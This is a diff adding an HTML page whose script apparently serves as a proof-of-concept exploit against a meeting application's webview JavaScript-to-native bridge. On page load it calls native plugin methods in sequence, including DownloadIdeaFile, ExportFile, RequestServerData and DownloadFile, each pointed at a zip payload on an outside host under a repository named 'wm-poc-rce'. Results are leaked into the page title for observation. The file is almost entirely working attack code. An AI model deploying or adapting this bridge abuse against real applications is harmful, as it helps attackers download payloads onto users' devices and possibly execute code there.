@@ -1,0 +1,31 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P59IDEA</title></head>
+<body><h1>P59IDEA</h1>
+<script>
+document.title='P59IDEA-START:'+location.host;
+window.__p=function(r){
+  try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
+  try{window.JSCallJavaMgr.JSCallNative(JSON.stringify({module:'CommonPlugin',method:'PrintLog',param:{log:JSON.stringify(r)},callId:'LOG'}))}catch(e){}
+  document.title='P59ICB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,48);
+};
+function c(id,mod,m,p){
+  try{window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:mod,method:m,param:p,callId:id}))}catch(e){document.title='P59IERR:'+id}
+}
+var idea={url:'https://gitwhs.github.io/wm-poc-rce/p50.zip',idea_id:'1',content_type:'application/zip',idea_title:'p59idea',meeting_code:'123456789'};
+var q=[
+  ['I1','CommonPlugin','GetWebPageRunningContext',{}],
+  ['I2','IdeaWebViewPlugin','DownloadIdeaFile',idea],
+  ['I3','CommonPlugin','ExportFile',{url:'https://gitwhs.github.io/wm-poc-rce/p50.zip',fileName:'p59idea.zip',contentType:'application/zip'}],
+  ['I4','CommonPlugin','RequestServerData',{url:'https://gitwhs.github.io/wm-poc-rce/p50.zip'}],
+  ['I5','MeetlogWebPlugin','DownloadFile',{url:'https://gitwhs.github.io/wm-poc-rce/p50.zip',fileName:'p59ml.zip'}],
+  ['I6','OpenApiPlugin','CheckJsApiConfig',{}],
+  ['I7','CommonPlugin','GetPerformance',{}]
+];
+var i=0;
+function n(){
+  if(i>=q.length){document.title='P59IDEA-DONE';return}
+  var x=q[i++];c(x[0],x[1],x[2],x[3]);setTimeout(n,900);
+}
+setTimeout(n,800);
+</script>
+</body></html>
